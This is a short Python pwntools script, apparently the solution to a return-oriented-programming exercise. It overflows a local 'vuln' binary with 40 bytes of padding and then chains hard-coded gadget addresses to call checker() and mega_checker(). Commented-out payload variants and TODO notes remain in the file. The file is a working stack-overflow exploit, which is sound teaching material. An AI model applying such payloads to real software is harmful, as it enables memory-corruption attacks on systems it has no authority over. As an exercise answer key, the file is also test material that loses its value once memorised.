#!/usr/bin/env python

"""
Solution (exploit) for rop-chain task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

io = process("vuln")
elf = ELF("./vuln")


# TODO: Fill required addresses.
offset = 40
pop_rdi_ret_address = 0x0000000000400743
value1 = 0x11223344
checker_address = elf.symbols["checker"]
value2_1 = 0x88776655
value2_2 = 0xaabbccdd
mega_checker_address = p64(elf.symbols["mega_checker"])

# TODO: Discover and fill address of gadget to initialize rsi.
rsi_gadget = p64(0x0000000000400741)

# TODO: Update payload to call mega_checker() after calling checker().
# payload = 40 * b'A' + p64(pop_rdi_ret_address) + p64(value1) +  p64(checker_address) + p64(pop_rdi_ret_address) + p64(value2_1) + rsi_gadget + p64(value2_2) + mega_checker_address
#payload = 40 * b'A' + p64(pop_rdi_ret_address) + p64(value2_1) + rsi_gadget + p64(value2_2) + mega_checker_address

payload = 40 * b'A' + p64(pop_rdi_ret_address) + p64(value1) + p64(checker_address) + p64(0x00000000004004fe)  + rsi_gadget + p64(value2_1) + p64(value2_2) + mega_checker_address 
# payload = 40 * b'A' + rsi_gadget + p64(value2_1) + p64(value2_2) + mega_checker_address + p64(0x00000000004004fe)

msg = io.recvuntil(': ')
io.sendline(payload)
# print(io.recv())

io.interactive()
